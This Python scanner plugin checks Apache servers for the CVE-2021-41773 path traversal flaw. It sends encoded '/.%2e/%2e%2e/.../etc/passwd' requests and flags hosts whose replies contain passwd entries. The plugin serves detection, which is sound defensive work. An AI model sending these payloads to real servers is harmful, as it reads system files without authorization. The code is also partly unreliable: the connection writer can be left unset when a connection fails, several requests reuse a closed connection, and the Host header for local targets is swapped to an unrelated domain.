import asyncio
import ssl
from plugins import NaslPlugin, PluginResult

class ApachePathTraversal41773(NaslPlugin):
    PLUGIN_ID = 1256
    NAME = "Apache HTTP Server Path Traversal (CVE-2021-41773)"
    FAMILY = "Web Servers"
    CVSS_SCORE = 7.5
    DESCRIPTION = "Apache HTTP Server 2.4.49 is vulnerable to a path traversal attack that allows remote attackers to read files outside the document root via crafted URL encoding."
    SOLUTION = "Upgrade Apache HTTP Server to version 2.4.50 or later."
    CVE = ["CVE-2021-41773"]
    PORTS = [80, 443, 8080, 8443]

    async def check_target(self, target: str, port: int | None = None) -> list[PluginResult]:
        results = []
        for port_to_check in (self.PORTS if port is None else [port]):
            try:
                scheme = "https" if port_to_check in (443, 8443) else "http"
                ctx = None
                if scheme == "https":
                    ctx = ssl.create_default_context()
                    ctx.check_hostname = False
                    ctx.verify_mode = ssl.CERT_NONE
                reader, writer = await asyncio.wait_for(
                    asyncio.open_connection(target, port_to_check, ssl=ctx), timeout=5
                )
                host_header = target
                if target in ("127.0.0.1", "localhost", "::1"):
                    host_header = "alieninc.tech"
                paths = [
                    "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
                    "/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
                    "/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
                ]
                for path in paths:
                    request = (
                        f"GET {path} HTTP/1.1\r\n"
                        f"Host: {host_header}\r\n"
                        f"Connection: close\r\n"
                        f"\r\n"
                    )
                    writer.write(request.encode())
                    await writer.drain()
                    response = b""
                    while True:
                        chunk = await asyncio.wait_for(reader.read(4096), timeout=5)
                        if not chunk:
                            break
                        response += chunk
                    decoded = response.decode("utf-8", errors="replace")
                    body = decoded.split("\r\n\r\n", 1)[1] if "\r\n\r\n" in decoded else ""
                    if "root:" in body and "bin:" in body:
                        results.append(PluginResult(
                            vulnerable=True,
                            target=target,
                            port=port_to_check,
                            cvss_score=self.CVSS_SCORE,
                            severity=self.severity_from_cvss(self.CVSS_SCORE),
                            description=self.DESCRIPTION,
                            solution=self.SOLUTION,
                            evidence=f"Path traversal confirmed via {path}. Response contains /etc/passwd content.",
                            references=self.CVE
                        ))
                        break
            except (asyncio.TimeoutError, ConnectionRefusedError, OSError, ssl.SSLError):
                continue
            finally:
                if writer:
                    writer.close()
                    await writer.wait_closed()
        if not results:
            results.append(PluginResult(vulnerable=False, target=target, port=port or 0, description="No issues detected"))
        return results
